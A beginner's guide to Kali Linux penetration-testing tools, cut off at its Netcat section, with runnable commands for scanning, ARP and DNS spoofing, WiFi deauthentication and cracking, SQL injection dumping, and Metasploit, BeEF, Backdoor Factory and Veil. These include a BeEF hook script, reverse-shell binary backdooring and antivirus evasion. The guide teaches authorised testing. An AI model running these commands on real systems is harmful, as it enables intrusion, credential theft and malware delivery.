# Kali Linux Security Tools — Complete Beginner's Guide

> **Legal Disclaimer:** All tools in this guide must only be used on networks and systems you own or have explicit written permission to test. Unauthorized use is illegal under the Computer Fraud and Abuse Act (CFAA) and equivalent laws worldwide. This guide is for educational and authorized penetration testing purposes only.

---

## How to Read This Guide

Think of a penetration test like **robbing your own house to find its weaknesses** before a real burglar does. You need to:
1. **Look at the neighborhood** — discover what's out there
2. **Examine the locks** — scan for open ports and vulnerabilities
3. **Pick the locks** — attempt exploitation
4. **Ransack the rooms** — extract data, escalate privileges
5. **Write a police report** — document findings

Each tool in this guide maps to one or more of those phases. We'll show you the **recommended order** of operations too.

---

## Recommended Orchestration (Tool Order)

```
PHASE 1 — RECONNAISSANCE (Passive, low noise)
  └── Maltego          ← gather public intelligence about target
  └── Netdiscover      ← find live hosts on the network
  └── Knockpy          ← discover subdomains

PHASE 2 — SCANNING (Active, more visible)
  └── Nmap / Zenmap    ← port scan, OS detection, service versions
  └── Dirb             ← find hidden web directories
  └── OWASP ZAP        ← web application vulnerability scan

PHASE 3 — VULNERABILITY ASSESSMENT
  └── Nexpose          ← full vulnerability database scan
  └── SQLmap           ← test for SQL injection

PHASE 4 — EXPLOITATION
  └── Metasploit       ← exploit vulnerabilities
  └── BeEF             ← browser exploitation
  └── Evilgrade        ← fake software update injection
  └── The Backdoor Factory ← backdoor existing binaries

PHASE 5 — NETWORK ATTACKS (Requires monitor mode)
  └── Aircrack-ng suite ← WiFi cracking
      └── Airmon-ng    ← enable monitor mode     [MONITOR MODE ON]
      └── Airodump-ng  ← capture packets
      └── Aireplay-ng  ← inject/deauth packets
      └── Aircrack-ng  ← crack the password      [MONITOR MODE OFF after]
  └── arpspoof         ← ARP poisoning / MITM
  └── Bettercap        ← full MITM framework

PHASE 6 — PAYLOAD / EVASION
  └── Veil Framework   ← AV-evading payloads
  └── Crunch           ← custom wordlist generation

PHASE 7 — ANALYSIS
  └── Wireshark        ← analyze captured traffic
  └── Netcat           ← raw connection testing / data transfer
```

---

## ⚠️ Monitor Mode — When to Turn It On and Off

Monitor mode lets your WiFi card **listen to all traffic in the air**, not just traffic addressed to you. Think of it like the difference between listening only to conversations directed at you vs. being able to hear everything in the room.

**Turn monitor mode ON before:** Airmon-ng, Airodump-ng, Aireplay-ng, Aircrack-ng

**Turn monitor mode OFF after:** finishing WiFi capture work — because while monitor mode is on, **your internet connection drops**. You cannot browse, use apt, or connect to anything while in monitor mode.

```bash
# Turn ON
sudo airmon-ng start wlan0

# Turn OFF
sudo airmon-ng stop wlan0mon
```

---

---

# TOOL REFERENCE

---

## 1. Netdiscover

### What Is It?
Think of Netdiscover as **walking through an apartment building and knocking on every door** to see who answers. It sends ARP requests across your subnet and reports back which IP addresses have a live device behind them.

### Install / Verify
```bash
sudo apt install netdiscover
```

### Basic Usage
```bash
# Passive mode (just listen, don't knock) — stealthy
sudo netdiscover -p -i eth0

# Active mode (knock on doors) — faster
sudo netdiscover -r 192.168.1.0/24 -i eth0
```

### Understanding the Output
```
IP              At MAC Address     Count     Len  MAC Vendor
192.168.1.1     aa:bb:cc:dd:ee:01      1      60  Netgear Inc.
192.168.1.25    aa:bb:cc:dd:ee:02      1      60  Apple Inc.
192.168.1.51    aa:bb:cc:dd:ee:03      1      60  Samsung Electronics
```

- **IP** — the device's address on your network
- **MAC Address** — the device's unique hardware ID (like a fingerprint)
- **MAC Vendor** — who made the device's network chip — this tells you if it's an iPhone, router, printer, etc.

### When to Use It
Always run Netdiscover **first** — you need to know who's home before you can do anything else.

---

## 2. Nmap

### What Is It?
If Netdiscover is knocking on apartment doors, Nmap is **inspecting every door, window, and mail slot of each apartment**. It tells you which "entrances" (ports) are open, what's running behind them, and what kind of building (OS) it is.

### Install / Verify
```bash
sudo apt install nmap
nmap --version
```

### Basic Usage

```bash
# Fast scan of common ports
sudo nmap -F 192.168.1.0/24

# Full scan with service version detection and OS detection
sudo nmap -sV -O -T4 192.168.1.1

# Scan all 65535 ports
sudo nmap -p- 192.168.1.1

# Save output to file
sudo nmap -sV -O -T4 192.168.1.1 -oN scan_results.txt

# Aggressive scan (all-in-one: OS, version, scripts, traceroute)
sudo nmap -A 192.168.1.1
```

### Timing Templates (-T)
| Flag | Name | Speed | Noise Level |
|------|------|-------|-------------|
| -T1 | Sneaky | Very slow | Very low |
| -T2 | Polite | Slow | Low |
| -T3 | Normal | Medium | Medium |
| -T4 | Aggressive | Fast | High |
| -T5 | Insane | Very fast | Very high |

Use -T2 or -T3 when you want to stay under the radar. Use -T4 on your own lab.

### Understanding the Output
```
PORT     STATE    SERVICE    VERSION
22/tcp   open     ssh        OpenSSH 7.9
80/tcp   open     http       Apache 2.4.38
443/tcp  open     https      nginx 1.14
3306/tcp filtered mysql
8080/tcp closed   http-proxy
```

- **open** — door is open, someone's home (a service is running)
- **closed** — door exists but no one's home (port reachable but no service)
- **filtered** — there's a wall in front of the door (firewall blocking)
- **SERVICE** — what's running (SSH = remote login, HTTP = website, etc.)
- **VERSION** — the exact software version — critical for finding known vulnerabilities

### Important Flags Explained
| Flag | What it does | Analogy |
|------|------|---------|
| -sV | Detect service versions | Reading the nameplate on each door |
| -O | OS detection | Figuring out if it's a house or apartment block |
| -sn | Ping scan only, no port scan | Just checking if lights are on |
| -p | Specify ports | Only check specific doors |
| -A | Aggressive (all detection) | Full forensic inspection |
| -oN | Save output as text | Writing your notes down |

---

## 3. Zenmap

### What Is It?
Zenmap is **Nmap with a visual interface** — the same tool, just with a graphical front end. It's particularly useful for its **network topology map** which draws a visual diagram of discovered devices.

### Launch
```bash
sudo zenmap
```
> Must be run with `sudo` — `-O` and raw socket features require root.

### How to Use It
1. Enter your **Target** in the Target field: `192.168.1.0/24`
2. Choose a **Profile** from the dropdown (Intense Scan, Quick Scan, etc.)
3. The **Command** field auto-populates — do not type `nmap` here, it's added automatically
4. Click **Scan**

### The Topology Tab
After scanning, click the **Topology** tab to see a visual map of all discovered devices and how they connect. This is Zenmap's main advantage over the terminal version.

### ⚠️ Common Mistake
Do not type `nmap` in the Command field — Zenmap adds it automatically. Typing it yourself results in scanning a host literally named "nmap".

---

## 4. Bettercap

### What Is It?
Bettercap is a **Swiss Army knife for network attacks** — it combines ARP spoofing, MITM, packet sniffing, DNS spoofing, and more into one interactive framework. Think of it as a surveillance van that can intercept, read, and even modify conversations passing through your network.

### Install
```bash
sudo apt install bettercap
```

### Launch
```bash
sudo bettercap -iface eth0
```
This opens an interactive shell.

### Basic Workflow

```bash
# Step 1: Discover hosts
net.probe on

# Step 2: View discovered hosts
net.show

# Step 3: Start ARP spoofing (MITM)
set arp.spoof.targets 192.168.1.25    # target IP
arp.spoof on

# Step 4: Enable packet sniffing
net.sniff on

# Step 5: Enable DNS spoofing (redirect domains to fake IPs)
set dns.spoof.domains facebook.com,google.com
set dns.spoof.address 192.168.1.100   # your machine
dns.spoof on

# Stop everything
arp.spoof off
net.sniff off
dns.spoof off
```

### Understanding the Output
When `net.sniff` is running you'll see lines like:
```
[HTTP] 192.168.1.25 -> POST http://example.com/login user=admin&pass=password123
```
This shows credentials passed over unencrypted HTTP. Over HTTPS you'd only see encrypted gibberish — which is exactly why HTTPS matters.

### ⚠️ Important Notes
- Bettercap is more effective on **HTTP (not HTTPS)** traffic
- Modern networks with HSTS, HTTPS everywhere, and certificate pinning greatly limit what you can see
- Always enable IP forwarding or victims lose internet:
```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

---

## 5. arpspoof

### What Is It?
Arpspoof is the **simple, single-purpose predecessor** to Bettercap's ARP capabilities. It does one thing: poison ARP tables to redirect traffic through your machine. Think of it as impersonating the post office — you tell everyone to send their mail to you, then you pass it on (or read it first).

### Install
```bash
sudo apt install dsniff   # arpspoof is part of the dsniff package
```

### Usage

```bash
# Enable IP forwarding FIRST (so victims don't lose internet)
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Tell the ROUTER that the victim's IP maps to YOUR MAC
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.25

# In a second terminal: tell the VICTIM that the router's IP maps to YOUR MAC
sudo arpspoof -i eth0 -t 192.168.1.25 192.168.1.1
```

You need **both commands running simultaneously** in separate terminals for a proper two-way MITM.

### Stopping Safely
Press `Ctrl+C` in both terminals. Arpspoof will automatically send corrective ARP packets to restore normal routing. ARP caches self-correct within 60-300 seconds regardless.

### ⚠️ Effectiveness Warning
On modern networks:
- HTTPS encrypts traffic even when intercepted
- Many browsers warn about certificate mismatches
- arpspoof is best used in lab environments or for demonstrating the vulnerability
- Use Bettercap for more advanced real-world scenarios

---

## 6. Wireshark

### What Is It?
Wireshark is a **packet analyzer** — imagine being able to slow down time and read every letter, postcard, and package passing through a post office. It captures and displays network traffic in extreme detail.

### Launch
```bash
sudo wireshark
```
Or from the Applications menu.

### Basic Workflow

1. **Select your interface** — click `eth0` or `wlan0` on the home screen
2. **Click the blue shark fin** to start capturing
3. **Watch packets flow** in real time
4. **Click the red square** to stop
5. **Apply filters** to find what you need

### Essential Filters

```
# Show only HTTP traffic
http

# Show traffic to/from a specific IP
ip.addr == 192.168.1.25

# Show only DNS queries
dns

# Show only TCP traffic
tcp

# Combine filters
http and ip.addr == 192.168.1.25

# Show packets with specific text in payload
frame contains "password"
```

### Understanding the Output

Each row in Wireshark represents one packet (one "envelope"). The columns are:
```
No.   Time      Source         Destination    Protocol  Info
1     0.000     192.168.1.25   8.8.8.8        DNS       Standard query A google.com
2     0.012     8.8.8.8        192.168.1.25   DNS       Standard response 142.250.80.46
3     0.015     192.168.1.25   142.250.80.46  TCP       SYN (connection start)
```

The **bottom pane** shows the packet broken into layers:
- **Ethernet layer** — MAC addresses
- **IP layer** — source/destination IPs  
- **TCP/UDP layer** — ports
- **Application layer** — the actual content (HTTP, DNS, etc.)

### When to Use With Other Tools
Run Wireshark **while arpspoof or Bettercap is running** to capture and analyze the intercepted traffic in detail.

### ⚠️ Monitor Mode and Wireshark
To capture WiFi packets from other devices, you need your card in monitor mode:
```bash
sudo airmon-ng start wlan0     # [MONITOR MODE ON]
sudo wireshark                 # select wlan0mon interface
# ... capture ...
sudo airmon-ng stop wlan0mon   # [MONITOR MODE OFF]
```

---

## 7. Aircrack-ng Suite

### What Is It?
The Aircrack-ng suite is a **WiFi security auditing toolkit**. Think of WiFi as a room full of people talking — normally you can only hear conversations addressed to you. These tools let you hear everything, then decode the secret language (encryption) being used.

### The Four Tools and Their Order

```
airmon-ng → airodump-ng → aireplay-ng → aircrack-ng
  (ears)      (listen)     (disrupt)     (decode)
```

---

### 7a. Airmon-ng — Enable Monitor Mode

Think of this as **swapping your normal ears for super-sensitive microphones** that pick up all conversations in range, not just the ones addressed to you.

```bash
# Check your wireless interface name
iwconfig

# Kill processes that might interfere (NetworkManager, wpa_supplicant)
sudo airmon-ng check kill     # ⚠️ THIS WILL DROP YOUR INTERNET CONNECTION

# Start monitor mode
sudo airmon-ng start wlan0

# Your interface is now renamed to wlan0mon
iwconfig   # verify — you should see wlan0mon in Monitor mode

# Stop monitor mode when done
sudo airmon-ng stop wlan0mon
sudo systemctl start NetworkManager   # restore internet
```

### ⚠️ MONITOR MODE WARNING
`airmon-ng check kill` **stops NetworkManager** and drops all network connections including your internet. Do this only when you are ready to do WiFi work. When done, run `airmon-ng stop` and restart NetworkManager.

---

### 7b. Airodump-ng — Capture Packets

Think of this as **writing down every conversation** in the room onto a notepad.

```bash
# Step 1: See all nearby networks
sudo airodump-ng wlan0mon

# Step 2: Lock onto a specific target network and save to file
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
#                 ^channel  ^target router MAC    ^save to "capture" files
```

### Understanding the Output
```
BSSID              PWR  Beacons  #Data  CH  ENC   ESSID
AA:BB:CC:DD:EE:FF  -45       89    234   6  WPA2  MyHomeNetwork
BB:CC:DD:EE:FF:00  -72       12      5  11  WPA2  Neighbor_WiFi

STATION            BSSID              PWR   Frames
11:22:33:44:55:66  AA:BB:CC:DD:EE:FF  -55     120   ← connected device
```

- **BSSID** — router's MAC address (unique ID)
- **PWR** — signal strength (closer to 0 = stronger, e.g. -45 is stronger than -72)
- **CH** — WiFi channel (1-13)
- **ENC** — encryption type (WPA2, WPA3, WEP, OPN)
- **ESSID** — the network name you see on your phone
- **STATION** — devices currently connected to that router

**Wait for a WPA2 handshake** — you'll see `WPA handshake: AA:BB:CC:DD:EE:FF` in the top right when a device connects or reconnects. This is what you need to crack the password.

---

### 7c. Aireplay-ng — Inject/Deauth

This tool can **force devices to disconnect and reconnect**, which causes them to perform a new WPA handshake — which you capture with Airodump-ng. Think of it as briefly cutting the phone line to force someone to call back, letting you record the new call setup.

```bash
# Deauthentication attack — kick a client off the network
# They reconnect automatically and you capture the handshake
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
#                ^0=deauth ^5=send 5 packets  ^router MAC           ^client MAC
```

Run this **in a separate terminal while Airodump-ng is still running** and watching for the handshake.

### Other Modes
| Mode | Flag | Use |
|------|------|-----|
| Deauthentication | -0 | Force reconnect to capture handshake |
| Fake authentication | -1 | Associate with AP |
| ARP replay | -3 | Generate traffic on WEP networks |

---

### 7d. Aircrack-ng — Crack the Password

Once you have the 4-way WPA handshake captured, Aircrack-ng **tries every word in a wordlist** as the password until one works. Think of it as trying every key on a giant keyring until one opens the lock.

```bash
# Crack using a wordlist
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
#                   ^wordlist file                     ^router MAC         ^capture file from airodump
```

### Understanding the Output
```
KEY FOUND! [ password123 ]
Master Key     : A1 B2 C3 D4 ...
Transient Key  : ...
```

Or if it fails:
```
Passphrase not in dictionary
```

### ⚠️ Effectiveness Warning — Very Important
- **WPA2 with a strong, unique password** — Aircrack-ng will almost certainly fail
- **WPA2 with a common password** — success depends entirely on wordlist quality
- **WPA3** — not crackable with Aircrack-ng currently
- The `rockyou.txt` wordlist has 14 million words — sounds like a lot, but a password like `Tr0ub4dor&3` won't be in it
- **Combine with Crunch** (see below) to generate custom wordlists based on what you know about the target

---

## 8. Crunch

### What Is It?
Crunch is a **wordlist generator**. If Aircrack-ng is trying keys on a keyring, Crunch is the machine that **manufactures the keys**. You tell it rules (length, characters, patterns) and it generates every possible combination.

### Install
```bash
sudo apt install crunch
```

### Basic Usage

```bash
# Generate all 8-character passwords using lowercase letters
crunch 8 8 abcdefghijklmnopqrstuvwxyz -o wordlist.txt

# Generate passwords 6-10 characters using letters and numbers
crunch 6 10 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -o wordlist.txt

# Pattern-based: @ = lowercase, , = uppercase, % = number, ^ = symbol
crunch 8 8 -t @@%%@@^^ -o patterns.txt

# Generate and pipe directly into Aircrack (no file needed)
crunch 8 8 0123456789 | aircrack-ng -w - -b AA:BB:CC:DD:EE:FF capture.cap
```

### ⚠️ Effectiveness Warning
- An 8-character all-lowercase wordlist = **208 billion entries** = hundreds of GB
- Full brute force is **impractical** for most passwords
- Crunch is most effective when you know **something** about the password (e.g., it starts with a name, ends in numbers, etc.)
- Use targeted patterns rather than pure brute force

---

## 9. OWASP ZAP (Zed Attack Proxy)

### What Is It?
OWASP ZAP is an **automated web application vulnerability scanner**. Think of it as hiring a professional locksmith to try every known lock-picking technique on a website's front and back doors. It's designed specifically for web apps.

### Install
```bash
sudo apt install zaproxy
```

### Launch
```bash
zaproxy
```
Or from Applications → Web Application Analysis → OWASP ZAP

### Basic Workflow

**Method 1: Automated Scan (easiest)**
1. Open ZAP
2. Enter target URL in the Quick Start tab: `http://192.168.1.100`
3. Click **Automated Scan**
4. Choose **Standard Scan**
5. Click **Attack**
6. Wait for scan to complete

**Method 2: Manual with Proxy**
1. Set your browser proxy to `127.0.0.1:8080`
2. Browse the target site normally
3. ZAP records all requests in the **Sites** tree
4. Right-click any site → **Attack** → **Active Scan**

### Understanding Alerts

ZAP categorizes findings by risk level:
```
🔴 High    — SQL Injection, Remote Code Execution, XSS
🟠 Medium  — Missing security headers, CSRF tokens
🟡 Low     — Information disclosure, clickjacking
🔵 Info    — Server version exposed, cookies without flags
```

Click any alert to see:
- **Description** — what the vulnerability is
- **Evidence** — the actual HTTP request/response that revealed it
- **Solution** — how to fix it
- **Reference** — further reading

### ⚠️ Effectiveness Warning
- ZAP is excellent for standard web vulnerabilities but may miss complex business logic flaws
- Active scanning **makes many requests** — it will appear in server logs
- Some sites have WAFs (Web Application Firewalls) that will block ZAP and potentially ban your IP

---

## 10. Dirb

### What Is It?
Dirb is a **web content scanner** — it tries to find hidden pages, directories, and files on a web server by guessing their names. Think of it as trying every room number in a hotel to see which doors open, including ones not listed at the front desk.

### Install
```bash
sudo apt install dirb
```

### Basic Usage

```bash
# Basic scan with default wordlist
dirb http://192.168.1.100

# Use a specific wordlist
dirb http://192.168.1.100 /usr/share/wordlists/dirb/big.txt

# Scan for specific extensions
dirb http://192.168.1.100 -X .php,.html,.txt

# Ignore specific response codes
dirb http://192.168.1.100 -N 404

# Save output
dirb http://192.168.1.100 -o dirb_results.txt
```

### Understanding the Output
```
==> DIRECTORY: http://192.168.1.100/admin/
+ http://192.168.1.100/login.php (CODE:200|SIZE:1024)
+ http://192.168.1.100/backup.zip (CODE:200|SIZE:45231)
+ http://192.168.1.100/config.php (CODE:403|SIZE:289)
```

- **CODE:200** — page exists and is accessible (found it!)
- **CODE:403** — page exists but access is forbidden (interesting — something's there)
- **CODE:301/302** — redirect (follow it)
- **==> DIRECTORY** — a directory was found (explore further)

Findings like `/admin/`, `backup.zip`, or `config.php` are exactly what an attacker — or authorized tester — wants to find.

### Wordlist Locations
```bash
ls /usr/share/wordlists/dirb/
# common.txt    ← good starting point
# big.txt       ← more comprehensive
# small.txt     ← quick check
```

---

## 11. Knockpy

### What Is It?
Knockpy is a **subdomain enumeration tool**. If a company owns `company.com`, they might also have `admin.company.com`, `dev.company.com`, `staging.company.com` — often less secured than the main site. Knockpy finds these hidden entrances. Think of it as finding every back door and service entrance of a building when you've only been given the front address.

### Install
```bash
pip3 install knockpy --break-system-packages
# or
sudo apt install knockpy
```

### Usage

```bash
# Basic subdomain scan
knockpy domain.com

# Use a custom wordlist
knockpy domain.com -w /usr/share/wordlists/subdomains.txt

# Output to JSON
knockpy domain.com --json output.json

# With DNS server specified
knockpy domain.com --dns 8.8.8.8
```

### Understanding the Output
```
subdomain           ip              code    server
admin.domain.com    203.0.113.10    200     nginx/1.14
dev.domain.com      203.0.113.11    200     Apache/2.4
staging.domain.com  203.0.113.12    302     -
mail.domain.com     203.0.113.13    -       -
```

Each discovered subdomain is a new potential attack surface. `dev` and `staging` environments are often poorly secured compared to production.

### ⚠️ Effectiveness Note
- Knockpy depends on DNS resolution — it's only as good as its wordlist
- Very large domains may take significant time
- Some organizations use wildcard DNS which causes false positives — Knockpy attempts to handle this

---

## 12. SQLmap

### What Is It?
SQLmap is an **automated SQL injection tool**. SQL injection is like finding a flaw in a bank's query form where you can write extra instructions that the computer interprets as commands rather than data. SQLmap automates the process of finding and exploiting these flaws. Think of it as a locksmith that specifically specializes in one type of lock — but it's extremely good at it.

### Install
```bash
sudo apt install sqlmap
```

### Basic Usage

```bash
# Test a URL with a parameter for SQL injection
sqlmap -u "http://192.168.1.100/page.php?id=1"

# Test POST request
sqlmap -u "http://192.168.1.100/login.php" --data="user=admin&pass=test"

# Enumerate databases (once injection confirmed)
sqlmap -u "http://192.168.1.100/page.php?id=1" --dbs

# Enumerate tables in a database
sqlmap -u "http://192.168.1.100/page.php?id=1" -D dbname --tables

# Dump a specific table
sqlmap -u "http://192.168.1.100/page.php?id=1" -D dbname -T users --dump

# Use a saved HTTP request from Burp/ZAP
sqlmap -r request.txt
```

### Understanding the Output
```
[INFO] GET parameter 'id' is vulnerable. Do you want to keep testing? [y/N]
[INFO] sqlmap identified the following injection point(s):
Parameter: id (GET)
    Type: boolean-based blind
    Payload: id=1 AND 1=1
    
[INFO] the back-end DBMS is MySQL
```

- **vulnerable parameter** — the specific input field that can be exploited
- **Injection type** — how the injection works (boolean-blind, time-based, UNION-based — increasingly powerful)
- **DBMS** — what database software is running (MySQL, PostgreSQL, MSSQL, etc.)

Once confirmed vulnerable, SQLmap can extract the entire database.

### ⚠️ Effectiveness Warning
- Only works if the target has **SQL injection vulnerabilities** — many modern frameworks prevent this by default
- Modern WAFs may detect and block SQLmap — use `--tamper` scripts to evade
- Some injections are "blind" and very slow — time-based injections can take hours for large datasets

---

## 13. Metasploit

### What Is It?
Metasploit is the **most widely used exploitation framework** in penetration testing. Think of it as a master key collection — it contains thousands of known exploits, payloads, and auxiliary tools. Once you've identified a vulnerability with Nmap or Nexpose, Metasploit is how you actually exploit it.

### Launch
```bash
# Start the database (recommended)
sudo service postgresql start
sudo msfdb init

# Launch Metasploit console
sudo msfconsole
```

### Basic Workflow

```bash
# Search for an exploit
msf6 > search type:exploit name:apache
msf6 > search CVE-2021-44228    # search by CVE number

# Select an exploit
msf6 > use exploit/multi/handler

# See required options
msf6 exploit(multi/handler) > show options

# Set options
msf6 exploit(multi/handler) > set RHOSTS 192.168.1.100   # target IP
msf6 exploit(multi/handler) > set RPORT 80                # target port
msf6 exploit(multi/handler) > set LHOST 192.168.1.25      # your IP

# Choose a payload
msf6 exploit(multi/handler) > show payloads
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp

# Run the exploit
msf6 exploit(multi/handler) > exploit
```

### Meterpreter Shell (Post-Exploitation)

If successful, you'll get a Meterpreter shell — an interactive session on the target:
```bash
meterpreter > sysinfo           # system information
meterpreter > getuid            # current user
meterpreter > getsystem         # attempt privilege escalation
meterpreter > hashdump          # dump password hashes
meterpreter > shell             # drop into OS shell
meterpreter > upload file.txt   # upload a file
meterpreter > download /etc/passwd  # download a file
meterpreter > screenshot        # take a screenshot
```

### ⚠️ Effectiveness Warning
- Metasploit exploits target **specific, known vulnerabilities** — a patched system will resist
- Most modern systems with up-to-date patches will not be vulnerable to most exploits
- Metasploit shines in lab environments with intentionally vulnerable VMs like **Metasploitable**, **DVWA**, or **HackTheBox** machines

---

## 14. Nexpose

### What Is It?
Nexpose (by Rapid7, who also makes Metasploit) is an **enterprise vulnerability scanner**. While Nmap tells you what ports are open, Nexpose goes further and says "that version of software has 14 known CVEs, here they are ranked by severity." Think of it as hiring a structural engineer to inspect your building rather than just looking at it yourself.

### Install
Nexpose is not in apt — download from Rapid7:
```bash
# Download from https://www.rapid7.com/products/nexpose/
chmod +x Rapid7Setup-Linux64.bin
sudo ./Rapid7Setup-Linux64.bin
```

### Access
After installation, Nexpose runs as a web application:
```
https://localhost:3780
Default credentials set during install
```

### Basic Workflow
1. **Login** to the web interface
2. **Create a Site** — define your scan target (IP range or hostnames)
3. **Configure Scan Template** — Full Audit, Discovery, Web Audit, etc.
4. **Run the Scan** — can take minutes to hours depending on scope
5. **Review the Report** — vulnerabilities listed by severity with remediation guidance

### Understanding Severity Scores
Nexpose uses **CVSS scores** (0-10):
```
9.0-10.0  Critical  — patch immediately
7.0-8.9   High      — patch soon
4.0-6.9   Medium    — plan remediation
0.1-3.9   Low       — address when possible
0         Info      — not a vulnerability, just information
```

### ⚠️ Effectiveness and Practical Notes
- Nexpose is **commercial software** — the Community Edition is free but limited to 32 IPs
- It is extremely comprehensive but also noisy — will definitely show up in logs
- Best used in authorized enterprise environments, not casual home use
- Integrates directly with Metasploit for one-click exploitation of discovered vulnerabilities

---

## 15. Maltego

### What Is It?
Maltego is an **open-source intelligence (OSINT) and link analysis tool**. It aggregates publicly available information about targets — domain names, email addresses, people, companies, social media — and visualizes the relationships between them as a graph. Think of it as a **detective's evidence board** that automatically connects the dots for you.

### Install
```bash
sudo apt install maltego
```

### Launch
```bash
maltego
```
Requires a free account at paterva.com on first run.

### Basic Workflow

1. **Create a new graph**
2. **Drag an Entity** from the palette (Domain, Person, Email, etc.)
3. **Double-click the entity** and enter your target (e.g., `example.com`)
4. **Right-click → Run Transforms** — this queries public data sources
5. **Select transforms** like "To DNS Name", "To IP Address", "To Email Address"
6. Watch the graph expand with discovered relationships

### Understanding the Graph
```
example.com ──→ mail.example.com ──→ 203.0.113.5 ──→ AS12345 (ISP)
            ──→ admin@example.com ──→ John Smith ──→ LinkedIn Profile
            ──→ dev.example.com   ──→ GitHub repo
```

Each node is a piece of information. Each line is a discovered relationship. The goal is to map everything connected to your target **before touching a single system**.

### ⚠️ Effectiveness Warning
- Maltego is only as good as **public data** — private/internal targets have little footprint
- Some transforms require paid API keys (Shodan, VirusTotal, etc.)
- The free Community Edition limits transform results to 12 entities per run
- Most effective for **external reconnaissance** on organizations with significant web presence

---

## 16. BeEF (Browser Exploitation Framework)

### What Is It?
BeEF hooks into victims' **web browsers** via a malicious JavaScript snippet. Once hooked, you can run commands through the browser — take screenshots, steal cookies, redirect pages, perform network scans from within the browser. Think of it as **planting a spy inside someone's web browser** that reports back to you and follows your instructions.

### Install
```bash
sudo apt install beef-xss
```

### Launch
```bash
sudo beef-xss
```
Access the control panel at `http://127.0.0.1:3000/ui/panel`
Default credentials: `beef:beef`

### How It Works

**Step 1:** Get a victim to load a page containing the hook script:
```html
<script src="http://YOUR_IP:3000/hook.js"></script>
```
This can be injected via XSS vulnerabilities, a fake page, or combined with other tools.

**Step 2:** Once a browser loads the hook, it appears in BeEF's panel under **Online Browsers**.

**Step 3:** Click a hooked browser → **Commands** tab → choose from hundreds of modules:
- Steal cookies
- Capture form credentials
- Take webcam photo (with browser permission prompt)
- Perform port scan of internal network
- Redirect to phishing page
- Mine cryptocurrency (educational demo)

### ⚠️ Effectiveness Warning — Very Important
- **Modern browsers** (Chrome, Firefox, Edge) have significantly reduced what JavaScript can do
- Many BeEF modules are **obsolete** against updated browsers
- Most effective against **older browsers** or combined with **social engineering**
- HTTPS and Content Security Policy (CSP) headers largely block BeEF's hook from loading on modern sites
- Best used in controlled lab environments to demonstrate the concept

---

## 17. Evilgrade

### What Is It?
Evilgrade is a **fake software update injection framework**. It impersonates software update servers (for Java, iTunes, VirtualBox, etc.) and delivers a malicious payload instead of a legitimate update. Think of it as intercepting a mail delivery truck and swapping the real package with a fake one. It requires a MITM position first (use arpspoof or Bettercap first).

### Install
```bash
sudo apt install evilgrade
# or
git clone https://github.com/infobyte/evilgrade
cd evilgrade && perl evilgrade.pl
```

### Basic Workflow

```bash
# Start evilgrade
sudo perl evilgrade.pl

# List available modules (software it can impersonate)
evilgrade > show modules

# Configure a module
evilgrade > configure java
evilgrade (java) > show options
evilgrade (java) > set agent /path/to/payload.exe
evilgrade (java) > start

# Now run DNS spoofing (via Bettercap or dnsspoof) to redirect 
# the target's update traffic to your machine
```

### ⚠️ Effectiveness Warning — Very Important
- **Most major software now uses code signing** — the update package must be cryptographically signed by the vendor. Evilgrade cannot forge these signatures.
- Works against **older or poorly implemented updaters** that don't verify signatures
- Modern Java, browsers, OS updates — essentially **not vulnerable** anymore
- Best suited for demonstrating the concept on legacy software in lab environments
- This is largely a historical/educational tool against modern software

---

## 18. The Backdoor Factory (BDF)

### What Is It?
The Backdoor Factory **injects shellcode into existing legitimate executables** without (ideally) breaking them. Think of it as hollowing out a book and hiding a listening device inside — the book still looks and reads normally, but now it does something extra. A victim runs what they think is a legitimate program, and it also executes your payload.

### Install
```bash
sudo apt install backdoor-factory
# or
git clone https://github.com/secretsquirrel/the-backdoor-factory
cd the-backdoor-factory && pip install -r requirements.txt
```

### Basic Usage

```bash
# Check if a binary can be backdoored
bdftool -f /path/to/binary.exe -s show

# List available shellcode payloads
bdftool -f /path/to/binary.exe -s show

# Inject a payload
bdftool -f /path/to/binary.exe -s reverse_shell_tcp -H 192.168.1.25 -P 4444 -o backdoored.exe
```

Combine with Metasploit to catch the reverse shell:
```bash
msf6 > use exploit/multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.25
msf6 > set LPORT 4444
msf6 > exploit
```

### ⚠️ Effectiveness Warning — Very Important
- **Modern antivirus will detect most BDF-generated backdoors** — this is where Veil Framework comes in
- Binaries with strict **code signing** cannot be backdoored without invalidating the signature
- Windows Defender, CrowdStrike, SentinelOne detect common shellcode patterns
- Works best on **unsigned binaries** and in environments without endpoint protection
- Use in combination with Veil for better AV evasion

---

## 19. Veil Framework

### What Is It?
Veil generates **antivirus-evading payloads**. Where Metasploit's default payloads are often caught by antivirus software, Veil wraps them in obfuscation techniques that make them harder to detect. Think of it as disguising a knife as an innocent-looking pen — it's still a knife, but security might not recognize it immediately.

### Install
```bash
sudo apt install veil
sudo veil   # first run triggers auto-install of dependencies
```

### Launch and Usage

```bash
sudo veil

# You'll see the main menu — choose a tool
[1] Evasion     ← generate AV-evading payloads
[2] Ordnance    ← generate shellcode

# Inside Evasion:
Veil/Evasion > list         # list all available payloads
Veil/Evasion > use 41       # example: python/meterpreter/rev_tcp

# Set options
[41]: set LHOST 192.168.1.25
[41]: set LPORT 4444
[41]: generate

# Name your payload
# Veil generates the file in /var/lib/veil/output/
```

### Understanding Payload Languages
Veil can wrap payloads in multiple languages:
- **Python** — compiled to exe via pyinstaller, often evades AV
- **PowerShell** — lives in memory, no file written to disk
- **C** — compiled binary, less detectable than scripted languages
- **Ruby/Perl** — less common, therefore less signature coverage

### ⚠️ Effectiveness Warning
- AV evasion is an **arms race** — Veil payloads that worked last year may be detected today
- Enterprise EDR solutions (CrowdStrike, Carbon Black) use behavioral analysis, not just signatures — much harder to evade
- Veil is most effective against **consumer AV** (Windows Defender, AVG, Norton)
- Always test your generated payload against VirusTotal before deploying (in authorized tests)

---

## 20. Netcat

### What Is It?
